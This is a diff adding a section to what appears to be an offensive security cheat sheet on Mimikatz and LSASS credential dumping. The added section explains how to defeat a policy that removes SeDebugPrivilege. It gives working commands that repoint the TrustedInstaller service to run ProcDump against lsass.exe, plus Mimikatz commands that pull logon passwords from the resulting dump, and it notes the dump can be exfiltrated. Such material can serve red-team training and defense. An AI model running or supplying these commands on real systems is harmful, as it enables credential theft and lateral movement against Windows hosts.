@@ -37,6 +37,26 @@ LSA Protection prevents non-protected processes from interacting with LSASS. Mim
 
 [![Mimikatz-Driver-Remove-LSASS-Protection](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)
 
+### Bypassing Disabled SeDebugPrivilege
+By default, SeDebugPrivilege is granted to the Administrators group through the Local Security Policy. In an Active Directory environment, [it is possible to remove this privilege](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5) by setting Computer Configuration --> Policies --> Windows Settings --> Security Settings --> Local Policies --> User Rights Assignment --> Debug programs defined as an empty group. Even in offline AD-connected devices, this setting cannot be overwritten and Local Administrators will receive an error when attempting to dump memory or use Mimikatz. 
+
+However, the TrustedInstaller account will still have access to dump memory and [can be used to bypass this defense](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled). By modifying the config for the TrustedInstaller service, the account can be run to use ProcDump and dump the memory for `lsass.exe`. 
+
+```
+sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
+sc start TrustedInstaller
+```
+
+[![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)
+
+This dump file can be exfiltrated to an attacker-controlled computer where the credentials can be extracted. 
+
+```
+# privilege::debug
+# sekurlsa::minidump lsass.dmp
+# sekurlsa::logonpasswords
+```
+
 ## Main
 
 ### **EVENT**
